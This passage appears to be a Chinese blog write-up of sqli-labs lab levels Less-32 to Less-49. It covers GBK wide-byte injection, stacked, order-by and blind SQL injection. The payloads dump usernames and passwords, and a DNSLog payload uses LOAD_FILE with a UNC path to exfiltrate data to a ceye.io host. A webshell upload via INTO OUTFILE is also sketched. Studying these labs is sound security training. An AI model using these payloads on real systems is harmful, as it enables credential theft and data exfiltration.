   $string &#x3D; preg_replace(&#39;&#x2F;\&quot;&#x2F;&#39;, &quot;\\\&quot;&quot;, $string);                                &#x2F;&#x2F;escape double quote with a backslash              return $string;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h4><p>这个题目使用了宽字节注入</p><p>MySQL 在使用 GBK 编码的时候，会认为两个字符为一个汉字，例如 %aa%5c 就是一个 汉字。因为过滤方法主要就是在敏感字符前面添加 反斜杠 \，所以这里想办法干掉反斜杠即可。</p><pre><code>1. %df 吃掉 \</code></pre><p>具体的原因是 urlencode(&#39;) = %5c%27，我们在%5c%27 前面添加%df，形 成%df%5c%27，MySQL 在 GBK 编码方式的时候会将两个字节当做一个汉字，这个时候就把%df%5c 当做是一个汉字，%27 则作为一个单独的符号在外面，同时也就达到了我们的目的。</p><pre><code>2. 将 \&#39; 中的 \ 过滤掉</code></pre><p>例如可以构造 %5c%5c%27 的情况，后面的%5c会被前面的%5c 给注释掉。这也是 bypass 的一种方法。</p><p>本关卡采用第一种 %df 宽字节注入来吃掉反斜杠，下面直接丢 payload 吧：</p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">id&#x3D;-1%df&#39; UNION SELECT 1,2,(SELECT GROUP_CONCAT(username,password SEPARATOR 0x3c62723e) FROM users)-- +<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Less-33"><a href="#Less-33" class="headerlink" title="Less-33"></a>Less-33</h3><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合注入&amp;报错注入&amp;时间盲注&amp; 布尔盲注</td><td>id=’$id’</td></tr></tbody></table><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">function check_addslashes($string)&#123;    $string&#x3D; addslashes($string);        return $string;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这次过滤语句变味了addslashes，我们需要了解下它的功能。</p><p>ddslashes() 函数返回在预定义字符之前添加反斜杠的字符串。</p><table><thead><tr><th>预定义字符</th><th>转义后</th></tr></thead><tbody><tr><td>\</td><td>\‘</td></tr><tr><td>‘</td><td>&#39;</td></tr><tr><td>“</td><td>&quot;</td></tr></tbody></table><p>该函数可用于为存储在数据库中的字符串以及数据库查询语句准备字符串，和 Less-32 的函数功能是差不的，依旧可以使用宽字节进行注入。</p><p>注入天书：使用 addslashes(),我们需要将 mysql_query 设置为 binary 的方式，才能防御此漏洞</p><h3 id="Less-34"><a href="#Less-34" class="headerlink" title="Less-34"></a>Less-34</h3><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>POST</td><td>联合注入&amp;报错注入&amp;时间盲注&amp; 布尔盲注</td><td>username=’$uname’</td></tr></tbody></table><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">$uname &#x3D; addslashes($uname1);   $passwd&#x3D; addslashes($passwd1);mysql_query(&quot;SET NAMES gbk&quot;);@$sql&#x3D;&quot;SELECT username, password FROM users WHERE username&#x3D;&#39;$uname&#39; and password&#x3D;&#39;$passwd&#39; LIMIT 0,1&quot;;$result&#x3D;mysql_query($sql);$row &#x3D; mysql_fetch_array($result);if($row)&#123;输出结果;&#125;else&#123;报错&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>与上题没有区别,只是请求方式改为了POST</p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">uname&#x3D;-1%df&#39; UNION SELECT 1,(SELECT GROUP_CONCAT(username,password SEPARATOR 0x3c62723e) FROM users)#&amp;passwd&#x3D;123<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>注意，不知道为什么在文本框输入以及POSTMAN发送都无法成功，语句一模一样，难道是因为经过url编码的问题吗。</p><p>此外还有一个方法在注入天书以及国光的博客中。之后再研究以下。</p><h3 id="Less-35"><a href="#Less-35" class="headerlink" title="Less-35"></a>Less-35</h3><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合注入&amp;报错注入&amp;时间盲注&amp; 布尔盲注</td><td>id=$id</td></tr></tbody></table><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$id</span><span class="token operator">=</span><span class="token function">check_addslashes</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"SET NAMES gbk"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"SELECT * FROM users WHERE id=<span class="token interpolation"><span class="token variable">$id</span></span> LIMIT 0,1"</span><span class="token punctuation">;</span><span class="token variable">$result</span><span class="token operator">=</span><span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysql_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">check_addslashes</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$string</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$string</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>额,过滤还是老套路,但是这次竟然没有闭合,导致过滤语句直接没用了….。直接给payload吧</p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">-1 UNION SELECT 1,(SELECT GROUP_CONCAT(username,password SEPARATOR 0x3c62723e) FROM users),3#<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="Less-36"><a href="#Less-36" class="headerlink" title="Less-36"></a>Less-36</h3><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合注入&amp;报错注入&amp;时间盲注&amp; 布尔盲注</td><td>id=’$id’</td></tr></tbody></table><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">$id&#x3D;check_quotes($_GET[&#39;id&#39;]);function check_quotes($string)&#123;    $string&#x3D; mysql_real_escape_string($string);        return $string;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这一关主要考查了 Bypass MySQL Real Escape String，mysql_real_escape_string 会检测并转义如下危险字符：</p><table><thead><tr><th>危险字符</th><th>转义后</th></tr></thead><tbody><tr><td>\</td><td>\</td></tr><tr><td>‘</td><td>&#39;</td></tr><tr><td>“</td><td>&quot;</td></tr></tbody></table><p>我们之前的思路完全是可行的</p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">id&#x3D;-1%df&#39; UNION SELECT 1,2,(SELECT GROUP_CONCAT(username,password SEPARATOR 0x3c62723e) FROM users)-- +<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="Less-37"><a href="#Less-37" class="headerlink" title="Less-37"></a>Less-37</h3><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>POST</td><td>联合注入&amp;报错注入&amp;时间盲注&amp; 布尔盲注</td><td>id=’$id’</td></tr></tbody></table><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$uname</span> <span class="token operator">=</span> <span class="token function">mysql_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$uname1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$passwd</span><span class="token operator">=</span> <span class="token function">mysql_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$passwd1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>与Less-34类似，我们可以使用一样的思路</p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">uname&#x3D;1%df&#39; AND (SELECT 1343 FROM(SELECT COUNT(*),CONCAT(0x7e,(SELECT MID((IFNULL(CAST((password) AS NCHAR),0x20)),1,54) FROM security.users),0x7e,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- uwIe&amp;passwd&#x3D;123<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="小总结"><a href="#小总结" class="headerlink" title="小总结"></a>小总结</h3><p>经过三天还是四天来着，我也忘记了，反正可算搞完提升了，最近在学java和kali之类的，而且还在上课，所有精力没办法全放在这。完成了总归是好了。碎碎念结束，</p><p>下面我们捋一下我学到了那些东西。</p><ol><li><p>首先，我们我们学到了报文头部的注入点，以及当他们有base64解密时应当怎么做。</p></li><li><p>然后就是对于注释符的过滤，很简单简单闭合就可，比如：</p><pre class="line-numbers language-none"><code class="language-none">?id&#x3D;1&#39; and &#39;1&#39; &#x3D; &#39;1  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>之后便是二次注入，二次注入是什么呢？简单的说就是通过注册之类的方式先将注入语句写入数据库当中，不直接的进行注入，而是在其他地方调用这个语句，比如改密码，由此运行这个语句，从而完成了注入。</p></li><li><p>and与or以及各种关键词被过滤了，很多种过滤语句都有一种问题——没有循环，过滤一次就完了，这种时候我们就可以进行双写来绕过。又或者它的过滤条件不够充分，出现使用大小写就绕过的情况，所以我们使用正则表达式的时候将**/i**加上。至于or和and可以用&amp;&amp;和||进行代替。</p></li></ol><p>空格的绕过就有很多替代，比如我常用的%0b啊，其他的看我Less-26的解题。</p><ol start="5"><li><p>参数污染，也是一种很很巧妙的绕过，只要靠的就是apache的特性，当遇到相同的参数时，总是取最后一个。</p></li><li><p>宽字节注入，使用条件为GBK编码，会认为两个字符为汉字，而数据库并不在意数字直接忽略，由此使用%df与/拼接，完美绕过addslashes和mysql_real_escape_string。</p></li></ol><p>总结完毕，看起来不多，但是在构造payload时总是遇到各种情况，就是无法正常运行，主要是有些浮躁，没有考虑的完全清楚就去构造了，之后还应该注意。争取在之后的练习改正。与君共勉。</p><h2 id="Stacked-Injection"><a href="#Stacked-Injection" class="headerlink" title="Stacked Injection"></a>Stacked Injection</h2><h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><p>本次的注入的主题为堆叠注入。那么什么是堆叠注入呢</p><p>MySQL 的命令行中，每一条语句以;结尾，这代表语句的结束，如果在注入过程中在;后面添加要执行的 SQL 语句的话，这种注入方式就叫做堆叠注入 (stacked injection) 。</p><p><img src="stackedInjection1.png"></p><p>这很好理解，写过sql语句的都应该理解原理。</p><p>与 union select 联合查询相比，堆叠查询更加灵活，可以执行任意的 SQL 语句。</p><p>但是他仍然有缺陷。</p><ol><li>并不是每一个环境下都可以执行，可能受到 API 或者数据库引擎。</li><li>在 Web 中代码通常只返回一个查询结果，因此，堆叠注入第二个语句产生的错误或者结果只能被忽略</li></ol><p>这个就是为什么我们尝试用 union select 联合查询的原因，使用堆叠注入前，我们还需要了解数据库的相关信息才可以，如表名、列名等</p><h3 id="DNSLog-数据外带"><a href="#DNSLog-数据外带" class="headerlink" title="DNSLog 数据外带"></a>DNSLog 数据外带</h3><p>SQL注入一般分为报错注入和盲注，盲注的又分为布尔盲注和时间盲注。</p><p>当我们发现一个站点存在一个没有数据回显的注入点进行注入时，只能采取盲注，这种注入速度非常慢，需要一个一个字符猜解，而且很容易搞挂网站，这时候我们就需要寻找一种快速有效的方法来获取数据。</p><p>此时我们就可以利用DNS来快速的获取数据，当然我们也可以在无回显的命令执行或者无回显的SSRF中利用</p><p>特点：速度快，能够绕过某些防护软件的限制</p><h4 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h4><p>计算机网络的内容，这里不赘述了，简单地说想要得到域名所映射的IP地址，需要DNS协议进行解析。</p><h4 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h4><ol><li>Windows环境：</li></ol><p>所以我们需要搭建Windows环境下的SQLILABS环境。</p><ol start="2"><li>DNSLog：</li></ol><p>我们传输的数据传输到哪？如何查看？这就需要DNSLog的帮助。</p><p>这里给大家我正在使用的DNSLog网站，当然还可以自己搭建，如果有兴趣可以自己去网上查找教程。</p><p><a href="http://ceye.io/">ceye</a></p><ol start="3"><li>MySQL 开启 load_file()</li></ol><p>这里说一下我遇到的坑，我一开始始终无法将DNS请求发送出去，用Wireshark抓包也无法抓到，最终通过下面的文章解决。如果你遇到了和我一样的问题，不妨看一下。</p><p><a href="https://zhuanlan.zhihu.com/p/259904021">https://zhuanlan.zhihu.com/p/259904021</a></p><h4 id="UNC路径"><a href="#UNC路径" class="headerlink" title="UNC路径"></a>UNC路径</h4><p>load_file 函数在 Linux 下是无法用来做 DNSLog 攻击的，因为在这里就涉及到 Windows 的 UNC 路径。</p><p>其实我们平常在Widnows中用共享文件的时候就会用到这种网络地址的形式</p><p>UNC是一种命名惯例, 主要用于在Microsoft  Windows上指定和映射网络驱动器。UNC命名惯例最多被应用于在局域网中访问文件服务器或者打印机。我们日常常用的网络共享文件就是这个方式。UNC路径就是类似\softer这样的形式的网络路径</p><p>格式： </p><pre class="line-numbers language-none"><code class="language-none">\\servername\sharename<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>其中 servername 是服务器名，sharename 是共享资源的名称。</p><p>目录或文件的 UNC 名称可以包括共享名称下的目录路径，格式为：</p><pre class="line-numbers language-none"><code class="language-none">\\servername\sharename\directory\filename<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Less-38"><a href="#Less-38" class="headerlink" title="Less-38"></a>Less-38</h3><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合注入&amp;报错注入&amp;时间盲注&amp; 布尔盲注</td><td>id=’$id’</td></tr></tbody></table><p>我们在上面说明了一些基础知识，现在我们通过题目开始投注于实践。</p><p>老规矩先看源码，其实与之前区别不大，主要在于查询函数的区别</p><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">&#x2F;&#x2F; 现在mysqli_multi_query($con1, $sql)&#x2F;&#x2F; 从前$result&#x3D;mysql_query($sql);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>执行一个 SQL 语句，或者多个使用分号分隔的 SQL 语句。</p><p>要获得执行结果中的第一个结果集，请使用 mysqli_use_result() 或 mysqli_store_result() 函数。 要读取后续的结果集， 请使用 mysqli_more_results() 和 mysqli_next_result() 函数。</p><p>源代码</p><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">if (mysqli_multi_query($con1, $sql))&#123;            &#x2F;* store first result set *&#x2F;    if ($result &#x3D; mysqli_store_result($con1))    &#123;        if($row &#x3D; mysqli_fetch_row($result))        &#123;            输出账号密码        &#125;  &#x2F;&#x2F; 释放因为result所占用的内存(虽然这个语句备注了，但遇到不会的还是查一下吧)&#x2F;&#x2F;            mysqli_free_result($result);    &#125;        &#x2F;* print divider *&#x2F;&#x2F;&#x2F; 向下获得结果集    if (mysqli_more_results($con1))    &#123;            &#x2F;&#x2F;printf(&quot;-----------------\n&quot;);    &#125;     &#x2F;&#x2F;while (mysqli_next_result($con1));&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>从源码中我们可以清晰看出，我们使用堆叠查询也只能获得一个结果，但是我们可以进行一些不需要看结果的操作，比如修改表，创建列之类的。</p><p>我们在这里就可以用，DNSLog数据外带。</p><h4 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h4><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">?id&#x3D; 1&#39;;SELECT LOAD_FILE(CONCAT(&#39;\\\\&#39;,(SELECT hex(user())),&#39;.mysql.ip.port.k2y7z4.ceye.io\\abc&#39;));--+      <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>Hex 编码的目的就是减少干扰，因为域名是有一定的规范，有些特殊符号是不能带入的有。</p><p><img src="Less-38.png"></p><p>然后进行hex解码即可。</p><p>因为我在网站无法使用，所以直接在命令行中进行了执行。</p><h4 id="GETSHELL"><a href="#GETSHELL" class="headerlink" title="GETSHELL"></a>GETSHELL</h4><p>国光提了一下，我也没仔细研究，以后再说</p><h3 id="Less-39"><a href="#Less-39" class="headerlink" title="Less-39"></a>Less-39</h3><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合注入&amp;报错注入&amp;时间盲注&amp; 布尔盲注</td><td>id=$id</td></tr></tbody></table><p>仅仅闭合方式不同</p><h3 id="Less-40"><a href="#Less-40" class="headerlink" title="Less-40"></a>Less-40</h3><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合注入&amp;时间盲注&amp; 布尔盲注</td><td>id=(‘$id’)</td></tr></tbody></table><p>缺少了报错</p><h3 id="Less-41"><a href="#Less-41" class="headerlink" title="Less-41"></a>Less-41</h3><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合注入&amp;时间盲注&amp; 布尔盲注</td><td>id=$id</td></tr></tbody></table><p>与LEss-40类似，缺少了报错盲注。</p><h3 id="Less-42"><a href="#Less-42" class="headerlink" title="Less-42"></a>Less-42</h3><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>POST</td><td>报错注入&amp;联合注入&amp;时间盲注&amp; 布尔盲注&amp;堆叠注入</td><td>id=‘$id’</td></tr></tbody></table><p>首先在首页我们是无法进入其他页面的，他也提示我们直接在login进行注入。</p><p>老规矩先看源码。</p><p>login.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$username</span> <span class="token operator">=</span> <span class="token function">mysqli_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$con1</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"login_user"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"login_password"</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT * FROM users WHERE username='<span class="token interpolation"><span class="token variable">$username</span></span>' and password='<span class="token interpolation"><span class="token variable">$password</span></span>'"</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>@<span class="token function">mysqli_multi_query</span><span class="token punctuation">(</span><span class="token variable">$con1</span><span class="token punctuation">,</span> <span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$result</span> <span class="token operator">=</span> @<span class="token function">mysqli_store_result</span><span class="token punctuation">(</span><span class="token variable">$con1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>结果<span class="token punctuation">&#125;</span>  <span class="token keyword">else</span>  报错  <span class="token punctuation">&#125;</span>  <span class="token keyword">else</span><span class="token punctuation">&#123;</span>  报错  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们可以很明显的发现，username经过了过滤，但是password并没有，因而我们可以通过各种方式进行注入。</p><p>首先，我们来个常规的报错注入。</p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">1&#39; AND (SELECT 1343 FROM(SELECT COUNT(*),CONCAT(0x7E,(SELECT MID((IFNULL(CAST((column_name) AS NCHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name&#x3D;&quot;users&quot; AND table_schema&#x3D;&quot;security&quot; LIMIT 0,1),0x7E,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- uwIe&#96;&#96;&#96;&#96;此外还可以使用堆叠注入。我们还可以使用万能密码&#96;&#96;&#96; payload1&#39; or 1 -- +<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>登录成功后显示的用户为Dumb, 因为return $row[1];所以返回id=1的成员，即Dumb</p><p>然后我们看到了可以修改密码。查看以下源码</p><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">$username&#x3D; $_SESSION[&quot;username&quot;];$curr_pass&#x3D; mysql_real_escape_string($_POST[&#39;current_password&#39;]);$pass&#x3D; mysql_real_escape_string($_POST[&#39;password&#39;]);$re_pass&#x3D; mysql_real_escape_string($_POST[&#39;re_password&#39;]);if($pass&#x3D;&#x3D;$re_pass)&#123;$sql &#x3D; &quot;UPDATE users SET PASSWORD&#x3D;&#39;$pass&#39; where username&#x3D;&#39;$username&#39; and password&#x3D;&#39;$curr_pass&#39; &quot;;｝<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>第一反应和Less-24一样使用二次注入，但是我们没有注册，怎么办呢。</p><p>堆叠注入啊。我们完全可以从登录页面输入修改Dumb的用户名或者密码的注入语句，这样我们就可以在改密码的时候调用语句，形成二次注入。事不宜迟，我们试一下吧。</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">login_password&#x3D;1&#39; or 1 -- +&amp;login_user&#x3D;alter TABLE users modify COLUMN username varchar(2000);UPDATE users SET username &#x3D; &quot;-1&#39; UNION SELECT 1,2,(SELECT GROUP_CONCAT(username,password) FROM users)#&quot;WHERE username &#x3D; &quot;Dumb&quot;;&amp;mysubmit&#x3D;Login<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>嗯….上面语句在数据库中执行是可以的，但是输入后进入的页面用户还是dumb，原因未知。大家可以帮我看一下哪里出错了，反正就当一次脑洞了。</p><h3 id="Less-43"><a href="#Less-43" class="headerlink" title="Less-43"></a>Less-43</h3><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>POST</td><td>报错注入&amp;联合注入&amp;时间盲注&amp; 布尔盲注&amp;堆叠注入</td><td>id=(‘$id’)</td></tr></tbody></table><p>利用方式相同。</p><h3 id="Less-44"><a href="#Less-44" class="headerlink" title="Less-44"></a>Less-44</h3><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>POST</td><td>联合注入&amp;时间盲注&amp; 布尔盲注&amp;堆叠注入</td><td>id=‘$id’</td></tr></tbody></table><p>利用方式相同。缺少报错</p><h3 id="Less-45"><a href="#Less-45" class="headerlink" title="Less-45"></a>Less-45</h3><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>POST</td><td>联合注入&amp;时间盲注&amp; 布尔盲注&amp;堆叠注入</td><td>id=（‘$id’）</td></tr></tbody></table><h3 id="Less-46"><a href="#Less-46" class="headerlink" title="Less-46"></a>Less-46</h3><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>POST</td><td>时间盲注&amp; 布尔盲注&amp;报错</td><td>order by $sort</td></tr></tbody></table><p>与之前的都有所不同</p><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">$sql &#x3D; &quot;SELECT * FROM users ORDER BY $id&quot;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>注入点变为order by，不能使用union等注入。</p><h4 id="验证方式"><a href="#验证方式" class="headerlink" title="验证方式"></a>验证方式</h4><ul><li>方法一, 排序顺序</li></ul><pre class="line-numbers language-method" data-language="method"><div class="caption"><span>1</span></div><code class="language-method">&#x2F;&#x2F; 正序排序?sort&#x3D;1%20asc&#x2F;&#x2F; 倒序排序?sort&#x3D;1 desc&#96;&#96;&#96;&#96;两次结果的排序以id为标准，说明有order by* 方法二：rand（）排序rand(true) 和 rand(false)的结果是不同的&#96;&#96;&#96; method?sort&#x3D;rand(true)?sort&#x3D;rand(false)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>根据结果不同可以使用布尔盲注</p><ul><li>延时验证</li></ul><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">?sort&#x3D;sleep(1)?sort&#x3D;(sleep(1))?sort&#x3D;1 and sleep(1)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>延时时间为1*行数</p><h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4><ul><li>报错注入</li></ul><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">1 AND (SELECT 1343 FROM(SELECT COUNT(*),CONCAT(0x716a6a7171,(SELECT MID((IFNULL(CAST((table_name) AS NCHAR),0x20)),1,54) FROM INFORMATION_SCHEMA.TABLES  WHERE table_schema IN (0x7365637572697479)LIMIT 0,1),0x716b626a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- uwIe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li>布尔盲注</li></ul><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">?sort&#x3D;rand(left(database(),1)&gt;&#39;r&#39;)?sort&#x3D;rand(left(database(),1)&gt;&#39;s&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li>延时注入</li></ul><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">?sort&#x3D;rand(if(ascii(substr(database(),1,1))&gt;114,1,sleep(1)))?sort&#x3D;rand(if(ascii(substr(database(),1,1))&gt;115,1,sleep(1)))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li>procedure analyse注入</li></ul><p>利用procedure analyse参数，我们可以执行报错注入。同时，在procedure analyse和order by之间可以存在limit参数，我们在实际应用中，往往也可能会存在limit后的注入，可以利用procedure analyse进行注入。</p><p>PROCEDURE ANALYSE()自 MySQL 5.7.18 起已弃用，并已在 MySQL 8.0 中删除</p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">?sort&#x3D;1%20%20procedure%20analyse(extractvalue(rand(),concat(0x3a,version())),1)?sort&#x3D;1%20%20procedure%20analyse(updatexml(rand(),concat(0x3a,version()),1),1)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ul><li>导入导出文件into outfile参数</li></ul><p>将查询结果导入到文件当中</p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">?sort&#x3D;1%20into%20outfile%20%22c:\\wamp\\www\\sqllib\\test1.txt%22<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>那这个时候我们可以考虑上传网马，利用lines terminated by。</p><pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">Into outtfile c:\\wamp\\www\\sqllib\\test1.txt lines terminated by 0x(网马进行16进制转换)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这里需要Web写入权限，之后在研究</p><h3 id="Less-47"><a href="#Less-47" class="headerlink" title="Less-47"></a>Less-47</h3><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>POST</td><td>时间盲注&amp; 布尔盲注&amp;报错</td><td>order by ‘$sort’</td></tr></tbody></table><p>仅仅是闭合方式不同</p><h3 id="Less-48"><a href="#Less-48" class="headerlink" title="Less-48"></a>Less-48</h3><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>POST</td><td>时间盲注&amp; 布尔盲注</td><td>order by $sort</td></tr></tbody></table><p>没有了报错，但是还可以使用布尔盲注和时间盲注以及intooutfile</p><h3 id="Less-49"><a href="#Less-49" class="headerlink" title="Less-49"></a>Less-49</h3><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>POST</td><td>时间盲注&amp; 布尔盲注</td><td>order by ’$sort‘</td></tr></tbody></table><p>与上一题的区别闭合不同</p><h3 id="Less-50"><a href="#Less-50" class="headerlink" 